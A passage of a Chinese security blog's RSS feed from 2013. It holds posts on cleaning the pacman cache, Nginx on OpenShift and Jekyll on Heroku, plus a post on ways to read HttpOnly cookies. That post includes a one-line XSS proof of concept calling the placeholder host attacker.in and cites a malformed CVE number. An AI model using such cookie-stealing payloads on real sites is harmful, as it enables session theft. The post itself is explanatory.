&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pkg&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pkgs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;keys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;max_ver&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;&amp;quot;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ver&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pkgs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pkg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ver&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;max_ver&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;max_ver&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ver&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;pkgs_maxver&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pkg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;max_ver&lt;/span&gt; 
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pkgs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pkg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;max_ver&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pkg&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pkgs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;keys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ver&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pkgs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pkg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ver&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pkgs_maxver&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pkg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]:&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;fname&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pkg&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;#39;-&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ver&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;fname&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fname&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;-&amp;quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pkgs_ext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;del_list&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;


&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;file4del&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;del_list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;fullpath&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;dir&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;file4del&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;remove&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fullpath&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;except&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;pass&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
                <link>http://www.zzsec.org/2013/03/clean-pacman-cache</link>
                <guid>http://www.zzsec.org/2013/03/clean-pacman-cache</guid>
                <pubDate>2013-03-30T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>HttpOnly的那些事</title>
                <description>&lt;h3&gt;HttpOnly简介&lt;/h3&gt;

&lt;p&gt;故名思议，&lt;code&gt;HttpOnly&lt;/code&gt;是指仅在&lt;code&gt;HTTP&lt;/code&gt;层面上传输的&lt;code&gt;Cookie&lt;/code&gt;，当设置了&lt;code&gt;HttpOnly&lt;/code&gt;标志后，客户端脚本就无法读写该&lt;code&gt;Cookie&lt;/code&gt;，这样能有效的防御&lt;code&gt;XSS&lt;/code&gt;攻击。&lt;code&gt;HttpOnly&lt;/code&gt;是由微软在&lt;code&gt;2002&lt;/code&gt;年首先在&lt;code&gt;Internet Explorer 6 SP1&lt;/code&gt;上实现。根据微软的&lt;a href=&quot;http://msdn2.microsoft.com/en-us/library/ms533046.aspx&quot;&gt;描述&lt;/a&gt;，&lt;code&gt;HttpOnly&lt;/code&gt;是&lt;code&gt;HTTP Set-Cookie&lt;/code&gt;头中的一个附加标志，下面的例子就是一个头信息中设置了&lt;code&gt;HttpOnly Cookie&lt;/code&gt;。&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;text&quot;&gt;Set-Cookie: USER=123; expires=Wednesday, 09-Nov-99 23:12:40 GMT; HttpOnly
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;目前，基本上所有的浏览器和web框架都支持&lt;code&gt;HttpOnly&lt;/code&gt;。&lt;/p&gt;

&lt;!--more--&gt;

&lt;h3&gt;得到HttpOnly Cookie&lt;/h3&gt;

&lt;h5&gt;phpinfo信息&lt;/h5&gt;

&lt;p&gt;&lt;code&gt;phpinfo&lt;/code&gt;页面可以包含了&lt;code&gt;cookie&lt;/code&gt;信息，其中同样存在&lt;code&gt;HttpOnly Cookie&lt;/code&gt;，如下图。
&lt;img src=&quot;http://dl.zzsec.org/u/79944785/Blog/Pictures/2013-03-25-01.png&quot; alt=&quot;phpinfo()信息&quot;&gt;&lt;/p&gt;

&lt;h5&gt;支持TRACE方法的服务器&lt;/h5&gt;

&lt;p&gt;&lt;code&gt;Apache&lt;/code&gt;支持的一个&lt;code&gt;Header&lt;/code&gt;是&lt;code&gt;TRACE&lt;/code&gt;，&lt;code&gt;TRACE&lt;/code&gt;一般是用于调试，他会将请求头作为&lt;code&gt;HTTP Response Body&lt;/code&gt;返回。利用这个特性，可以把&lt;code&gt;HttpOnly Cookie&lt;/code&gt;读出来。不过目前各厂商已经禁止通过&lt;code&gt;Ajax&lt;/code&gt;发送&lt;code&gt;TRACE&lt;/code&gt;请求。&lt;/p&gt;

&lt;h5&gt;CVE-2012-0053&lt;/h5&gt;

&lt;p&gt;&lt;code&gt;Apache 2.2.x&lt;/code&gt;多个版本没有严格限制&lt;code&gt;HTTP&lt;/code&gt;请求头信息，&lt;code&gt;HTTP&lt;/code&gt;请求头信息超过&lt;code&gt;LimitRequestFieldSize&lt;/code&gt;长度时，服务器返回&lt;code&gt;400&lt;/code&gt;错误，并在返回信息中将出错的请求头内容输出。利用这个特性，可以得到&lt;code&gt;HttpOnly Cookie&lt;/code&gt;。&lt;/p&gt;

&lt;h5&gt;Django等一些web框架的调试页面&lt;/h5&gt;

&lt;p&gt;开启了调试模式的一些框架，会将程序的信息输出，其中就有&lt;code&gt;Cookie&lt;/code&gt;信息。&lt;/p&gt;

&lt;h5&gt;CVE-3009-0357&lt;/h5&gt;

&lt;p&gt;&lt;code&gt;Firefox &amp;lt;= 1.9.1&lt;/code&gt;在处理&lt;code&gt;HttpOnly Cookies&lt;/code&gt;时存在bug，通过&lt;code&gt;getResponseHeader()&lt;/code&gt;得不到&lt;code&gt;HttpOnly Cookie&lt;/code&gt;，但是通过&lt;code&gt;getAllResponseHeaders()&lt;/code&gt;可以得到。&lt;/p&gt;

&lt;h5&gt;Java getHeaderField&lt;/h5&gt;

&lt;p&gt;POC:&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;text&quot;&gt;alert(new java.net.URL(&amp;#39;http://attacker.in/xss/cookie.php&amp;#39;).openConnection().getHeaderField(&amp;#39;set-cookie&amp;#39;));
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h3&gt;参考&lt;/h3&gt;

&lt;ol&gt;
&lt;li&gt;&lt;a href=&quot;https://www.owasp.org/index.php/HttpOnly&quot;&gt;https://www.owasp.org/index.php/HttpOnly&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://seckb.yehg.net/2012/06/xss-gaining-access-to-httponly-cookie.html&quot;&gt;http://seckb.yehg.net/2012/06/xss-gaining-access-to-httponly-cookie.html&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://bugzilla.redhat.com/show_bug.cgi?id=785069&quot;&gt;https://bugzilla.redhat.com/show_bug.cgi?id=785069&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://bugzilla.mozilla.org/show_bug.cgi?id=380418&quot;&gt;https://bugzilla.mozilla.org/show_bug.cgi?id=380418&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
</description>
                <link>http://www.zzsec.org/2013/03/something-about-httponly</link>
                <guid>http://www.zzsec.org/2013/03/something-about-httponly</guid>
                <pubDate>2013-03-24T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>Install Nginx in OpenShift</title>
                <description>&lt;h3&gt;前言&lt;/h3&gt;

&lt;p&gt;这几天将博客搬移到了&lt;code&gt;OpenShift&lt;/code&gt;上，使用它的&lt;code&gt;DIY app&lt;/code&gt;，搭建了一个&lt;code&gt;Nginx&lt;/code&gt;环境用来跑我的静态博客。&lt;code&gt;OpenShift&lt;/code&gt;使用的是&lt;code&gt;Amazon&lt;/code&gt;的主机，国内访问有点慢，通过&lt;code&gt;CloudFlare&lt;/code&gt;来做&lt;code&gt;CDN&lt;/code&gt;感觉效果不是很明显，但是考虑到博客主要是自己访问，通过代理速度还可以接受，毕竟&lt;code&gt;CloudFlare&lt;/code&gt;能够使网站在全美国的&lt;code&gt;ping&lt;/code&gt;在10ms左右。&lt;/p&gt;

&lt;h3&gt;OpenShift简介&lt;/h3&gt;

&lt;p&gt;&lt;a href=&quot;https://openshift.redhat.com&quot;&gt;&lt;strong&gt;OpenShift&lt;/strong&gt;&lt;/a&gt;是Red Hat公司推出的一个PaaS，支持Java、PHP、Perl、Ruby等很多的开发框架，开发者通过&lt;code&gt;git&lt;/code&gt;来部署代码，也可以通过ssh登录到主机进行配置。OpenShift对于免费用户的一些限制参考这个&lt;a href=&quot;https://www.openshift.com/faq/how-many-applications-can-i-deploy-and-what-resource-limitations-would-they-have&quot;&gt;页面&lt;/a&gt;。&lt;/p&gt;

&lt;!--more--&gt;

&lt;h3&gt;创建OpenShift applications&lt;/h3&gt;

&lt;p&gt;创建一个新的app，名为blog。&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;text&quot;&gt;rhc app create blog diy-0.1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;查看blog的相关信息。&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;text&quot;&gt;rhc app show -a blog
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;使用上个命令列出的信息ssh到服务器，形式大概是：&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;text&quot;&gt;ssh &amp;lt;random-strings&amp;gt;@blog-&amp;lt;your-namespace&amp;gt;.rhcloud.com
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;系统中默认会有一些定义好了的环境变量(&lt;a href=&quot;https://www.openshift.com/page/openshift-environment-variables&quot;&gt;点我查看&lt;/a&gt;),再接下来的配置中会用到。&lt;/p&gt;

&lt;h3&gt;安装Nginx&lt;/h3&gt;

&lt;p&gt;现在就可以进行&lt;code&gt;nginx&lt;/code&gt;的安装了。首先要下载&lt;code&gt;nginx&lt;/code&gt;的源码&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;text&quot;&gt;cd $OPENSHIFT_TMP_DIR
wget http://nginx.org/download/nginx-1.2.7.tar.gz
tar zxf nginx-1.2.7.tar.gz
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;编译nginx需要PRCE。&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;text&quot;&gt;cd $OPENSHIFT_TMP_DIR
wget ftp://ftp.csx.cam.ac.uk/pub/software/programming/pcre/pcre-8.31.tar.bz2
tar jxf prce-8.31.tar.bz2
cf nginx-1.2.7
./configure --prefix=$OPENSHIFT_DATA_DIR --with-pcre=$OPENSHIFT_TMP_DIR/pcre-8.31
make Install
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;编译完成后，&lt;code&gt;nginx&lt;/code&gt;将会被装到&lt;code&gt;$OPENSHIFT_DATA_DIR&lt;/code&gt;中。&lt;/p&gt;

&lt;h3&gt;配置Nignx&lt;/h3&gt;

&lt;p&gt;&lt;code&gt;OpenShift&lt;/code&gt;只允许使用&lt;code&gt;$OPENSHIFT_INTERNAL_IP&lt;/code&gt;和&lt;code&gt;OPENSHIFT_INTERNAL_PORT&lt;/code&gt;，在&lt;code&gt;nginx&lt;/code&gt;的&lt;code&gt;http&lt;/code&gt;，&lt;code&gt;server&lt;/code&gt;和&lt;code&gt;location&lt;/code&gt;不能直接使用这些环境变量，所以我们用了点小技巧。&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;text&quot;&gt;vi $OPENSHIFT_DATA_DIR/conf/nginx.conf
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;编辑&lt;code&gt;listen&lt;/code&gt;的值为&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;text&quot;&gt;http {
    ...
    server {
        listen $OPENSHIFT_IP:$OPENSHIFT_PORT;
        server_name localhost;
        ...
    }
    ...
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;把这个作为模板，在app启动的时候生成配置文件&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;text&quot;&gt;mv $OPENSHIFT_DATA_DIR/conf/nginx.conf $OPENSHIFT_DATA_DIR/conf/nginx.conf.template
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h3&gt;编写start和stop脚本&lt;/h3&gt;

&lt;p&gt;在程序代码中编辑&lt;code&gt;.openshift/action_hooks/start&lt;/code&gt;，内容为：&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;text&quot;&gt;cd blog
vim .openshift/action_hooks/start
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;bash&quot;&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# The logic to start up your application should be put in this&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# script. The application will work only if it binds to&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# $OPENSHIFT_INTERNAL_IP:8080&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# nohup $OPENSHIFT_REPO_DIR/diy/testrubyserver.rb $OPENSHIFT_INTERNAL_IP $OPENSHIFT_REPO_DIR/diy &amp;gt; $OPENSHIFT_DIY_LOG_DIR/server.log 2&amp;gt;&amp;amp;1 &amp;amp;&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# replace the $OPENSHIFT_INTERNAL_IP and $OPENSHIFT_INTERNAL_PORT before starting up the server&lt;/span&gt;
sed -e &lt;span class=&quot;s2&quot;&gt;&amp;quot;s/`echo &amp;#39;$OPENSHIFT_IP:$OPENSHIFT_PORT&amp;#39;`/`echo $OPENSHIFT_INTERNAL_IP:$OPENSHIFT_INTERNAL_PORT`/&amp;quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$OPENSHIFT_DATA_DIR&lt;/span&gt;/conf/nginx.conf.template &amp;gt; &lt;span class=&quot;nv&quot;&gt;$OPENSHIFT_DATA_DIR&lt;/span&gt;/conf/nginx.conf
nohup &lt;span class=&quot;nv&quot;&gt;$OPENSHIFT_DATA_DIR&lt;/span&gt;/sbin/nginx &amp;gt; &lt;span class=&quot;nv&quot;&gt;$OPENSHIFT_DIY_LOG_DIR&lt;/span&gt;/server.log 2&amp;gt;&amp;amp;1 &amp;amp;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;text&quot;&gt;vi ./openshift/action_hooks/stop
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;bash&quot;&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
ps -ef | grep nginx | &lt;span class=&quot;k&quot;&gt;while &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;read &lt;/span&gt;line
&lt;span class=&quot;k&quot;&gt;do&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;kill&lt;/span&gt; -9 &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$line&lt;/span&gt; | awk &lt;span class=&quot;s1&quot;&gt;&amp;#39;{ print $2 }&amp;#39;&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;exit &lt;/span&gt;0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;提交代码，然后就可以用&lt;code&gt;rhc app start|stop|restart blog&lt;/code&gt;了。&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;PS&lt;/code&gt;:当&lt;code&gt;nginx&lt;/code&gt;使用3xx重定向请求时，指向的是&lt;code&gt;appname.rhcloud.com:8080&lt;/code&gt;,8080是内部监听端口，从外部请求8080端口将会超时，解决这个问题需要在nginx配置的&lt;code&gt;http&lt;/code&gt;部分中添加&lt;code&gt;port_in_redirect off;&lt;/code&gt;。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3&gt;参考&lt;/h3&gt;

&lt;ol&gt;
&lt;li&gt;&lt;a href=&quot;http://shawhu.org/2012-10/Jekyll-OpenShift/&quot;&gt;http://shawhu.org/2012-10/Jekyll-OpenShift/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.openshift.com/blogs/lightweight-http-serving-using-nginx-on-openshift&quot;&gt;https://www.openshift.com/blogs/lightweight-http-serving-using-nginx-on-openshift&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
</description>
                <link>http://www.zzsec.org/2013/03/install-nginx-in-openshift</link>
                <guid>http://www.zzsec.org/2013/03/install-nginx-in-openshift</guid>
                <pubDate>2013-03-22T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>heroku部署jekyll</title>
                <description>&lt;h3&gt;说明&lt;/h3&gt;

&lt;p&gt;在heroku上部署jekyll站点通常的做法是搭建jekyll环境，在heroku上进行编译，或者是使用rack-jekyll.为了部署方便，我们采用了在服务器上不安装jekyll的情况下，将jekyll编译好的文件通过git传到heroku。&lt;/p&gt;

&lt;p&gt;&lt;code&gt;cat config.ru&lt;/code&gt;&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;ruby&quot;&gt;&lt;span class=&quot;nb&quot;&gt;require&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;rack/contrib/static_cache&amp;#39;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;require&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;rack/contrib/try_static&amp;#39;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;require&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;rack/contrib/not_found&amp;#39;&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;use&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;Rack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:Deflater&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;use&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;Rack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:StaticCache&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;ss&quot;&gt;:urls&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;sx&quot;&gt;%w[/assets /favicon.ico]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;ss&quot;&gt;:root&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;_site&amp;quot;&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;use&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;Rack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:TryStatic&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;ss&quot;&gt;:urls&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;sx&quot;&gt;%w[/]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;ss&quot;&gt;:root&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;_site&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;ss&quot;&gt;:try&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;.html&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;index.html&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;/index.html&amp;#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;run&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;Rack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:NotFound&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;_site/404.html&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;!--more--&gt;

&lt;p&gt;&lt;code&gt;cat Gemfile&lt;/code&gt;&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;ini&quot;&gt;&lt;span class=&quot;err&quot;&gt;source&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;&amp;quot;https://rubygems.org&amp;quot;&lt;/span&gt;

&lt;span class=&quot;err&quot;&gt;gem&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;&amp;quot;rack-contrib&amp;quot;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;&amp;quot;~&amp;gt;&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;1.1.0&amp;quot;&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;gem&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;&amp;quot;puma&amp;quot;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;&amp;quot;~&amp;gt;&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;1.6.3&amp;quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;code&gt;Gemfile.lock&lt;/code&gt;可以由&lt;code&gt;bundle install&lt;/code&gt;生成&lt;/p&gt;

&lt;p&gt;&lt;code&gt;cat Procfile&lt;/code&gt;&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;text&quot;&gt;web:     bundle exec puma -p $PORT config.ru
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;建立子目录&lt;code&gt;_site&lt;/code&gt;，在&lt;code&gt;_config.yaml&lt;/code&gt;中设置&lt;code&gt;destination:./.site/_site&lt;/code&gt;，每次通过jekyll生成的文件放到这个目录中，然后在&lt;code&gt;./site&lt;/code&gt;中可以通过git传到heroku。&lt;/p&gt;
</description>
                <link>http://www.zzsec.org/2013/03/build-jekyll-in-heroku</link>
                <guid>http://www.zzsec.org/2013/03/build-jekyll-in-heroku</guid>
                <pubDate>2013-03-21T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>New Blog</title>
                <description>&lt;h3&gt;题外话&lt;/h3&gt;

&lt;blockquote&gt;
